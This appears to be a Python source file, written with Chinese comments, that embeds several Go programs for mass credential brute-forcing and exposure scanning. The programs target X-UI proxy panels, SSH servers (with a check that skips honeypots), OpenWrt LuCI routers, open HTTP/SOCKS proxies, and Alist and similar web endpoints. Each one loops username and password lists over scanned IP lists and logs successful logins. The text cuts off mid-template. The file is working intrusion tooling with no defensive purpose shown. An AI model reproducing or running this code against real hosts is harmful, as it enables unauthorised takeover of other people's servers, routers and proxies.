# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 最终修复 ====================
# 强制要求使用 Python 3 运行，防止版本不匹配导致 'ModuleNotFoundError'
if sys.version_info[0] < 3:
    print("错误：此脚本需要 Python 3 运行。")
    print("请使用 'python3 xui.py' 命令来执行。")
    sys.exit(1)
# ================================================

# 依赖将在check_environment()中安装，这里仅做导入
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    # 留空，让环境检查函数处理依赖安装
    pass

try:
    import readline
except ImportError:
    pass

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板（已净化） ===========================
# 为防止BOM字符问题，所有Go模板都重写为行列表
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) == 0 || len(passwords) == 0 {",
    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
    "		return",
    "	}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "    if len(usernames) == 0 || len(passwords) == 0 {",
    "        fmt.Println(\"错误：用户名或密码列表为空。\")",
    "        return",
    "    }",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {",
    "				if !isLikelyHoneypot(client) {",
    "					file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{",
    "		User:            username,",
    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
    "		Timeout:         {timeout} * time.Second,",
    "	}",
    "	client, err := ssh.Dial(\"tcp\", addr, config)",
    "    return client, err == nil, err",
    "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, paths, client)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, paths []string, client *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	for _, path := range paths {",
    "		if tryBothProtocols(ipPort, path, client, file) { break }",
    "	}",
    "}",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	return false",
    "}",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
    "	if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
    "		if readErr != nil { return false, readErr }",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
    "			return true, nil",
    "		}",
    "	} else {",
    "		io.Copy(io.Discard, resp.Body)",
    "	}",
    "	return false, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, paths)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	client := &http.Client{",
    "		Transport: tr,",
    "		Timeout: {timeout} * time.Second,",
    "		CheckRedirect: func(req *http.Request, via []*http.Request) error {",
    "			return http.ErrUseLastResponse",
    "		},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, client)",
    "	}",
    "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}",
    "	trimmed := strings.TrimSpace(line)",
    "	if strings.HasPrefix(trimmed, \"http\") {",
    "		targets = append(targets, trimmed)",
    "	} else {",
    "		targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed)",
    "	}",
    "	for _, target := range targets {",
    "		u, err := url.Parse(target)",
    "		if err != nil { continue }",
    "		origin := u.Scheme + \"://\" + u.Host",
    "		referer := origin + \"/\"",
    "		for _, username := range usernames {",
    "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password))",
    "					return",
    "				}",
    "			}",
    "		}",
    "	}",
    "}",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
    "	if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Origin\", origin)",
    "	req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false ",
    "    }",
    "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body)",
    "	for _, c := range resp.Cookies() {",
    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"io/ioutil\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/net/proxy\"",
    ")",
    "var (",
    "	proxyType    = \"{proxy_type}\"",
    "	authMode     = {auth_mode}",
    "	testURL      = \"http://myip.ipip.net\"",
    "	realIP       = \"\"",
    ")",
    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := &http.Client{ Timeout: {timeout} * time.Second }",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, outputFile, httpClient)",
    "	}",
    "}",
    "func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client) {",
    "	var found bool",
    "	checkAndFormat := func(auth *proxy.Auth) {",
    "        if found { return }",
    "		success, _ := checkConnection(proxyAddr, auth, httpClient)",
    "		if success {",
    "            found = true",
    "			var result string",
    "			if auth != nil && auth.User != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			outputFile.WriteString(result + \"\\n\")",
    "		}",
    "	}",
    "	switch authMode {",
    "	case 1:",
    "		checkAndFormat(nil)",
    "	case 2:",
    "		usernames := {user_list}",
    "		passwords := {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				auth := &proxy.Auth{User: user, Password: pass}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	case 3:",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 {",
    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	}",
    "}",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
    "	if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { return \"\", err }",
    "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(body)",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			return ipParts[0], nil",
    "		}",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client) (bool, error) {",
    "	transport := &http.Transport{ ",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	timeout := {timeout} * time.Second",
    "	if proxyType == \"http\" || proxyType == \"https\" {",
    "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "		} else {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "		}",
    "		proxyURL, err := url.Parse(proxyURLString)",
    "		if err != nil { return false, err }",
    "		transport.Proxy = http.ProxyURL(proxyURL)",
    "	} else {",
    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{",
    "			Timeout:   timeout,",
    "			KeepAlive: 30 * time.Second,",
    "		})",
    "		if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "			return dialer.Dial(network, addr)",
    "		}",
    "	}",
    "	httpClient.Transport = transport",
    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
    "	if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
    "	body, readErr := ioutil.ReadAll(resp.Body)",
    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
    "	proxyIP := string(body)",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			proxyIP = ipParts[0]",
    "		}",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
    "	return true, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	var err error",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil {",
    "		realIP = \"UNKNOWN\"",
    "	}",
    "	proxies, err := os.Open(inputFile)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer proxies.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(proxies)",
    "	for scanner.Scan() {",
    "		proxyAddr := strings.TrimSpace(scanner.Text())",
    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{",
    "		Proxy: http.ProxyFromEnvironment,",
    "		DialContext: (&net.Dialer{",
    "			Timeout:   {timeout} * time.Second,",
    "			KeepAlive: 0,",
    "		}).DialContext,",
    "		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},",
    "		TLSHandshakeTimeout:   {timeout} * time.Second,",
    "		ResponseHeaderTimeout: {timeout} * time.Second,",
    "		ExpectContinueTimeout: 1 * time.Second,",
    "		ForceAttemptHTTP2:     false,",
    "		DisableKeepAlives: true,",
    "	}",
    "	return &http.Client{",
    "		Transport: tr,",
    "		Timeout:   ({timeout} + 1) * time.Second,",
    "	}",
    "}",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := createHttpClient()",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, file, httpClient)",
    "	}",
    "}",
    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
    "	parts := strings.SplitN(ipPort, \":\", 2)",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
    "		if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		req.Header.Set(\"Connection\", \"close\")",
    "		resp, err := httpClient.Do(req)",
    "       cancel()",
    "		if err != nil {",
    "			if resp != nil { resp.Body.Close() }",
    "			continue",
    "		}",
    "		if isValidResponse(resp) {",
    "			file.WriteString(base + \"\\n\")",
    "			resp.Body.Close()",
    "			return",
    "		}",
    "		resp.Body.Close()",
    "	}",
    "}",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
    "	if err != nil { return false }",
    "	var data map[string]interface{}",
    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	if v, ok := data[\"code\"]; ok {",
    "		switch t := v.(type) {",
    "		case float64:",
    "			return int(t) == 200",
    "		case string:",
    "			return t == \"200\"",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
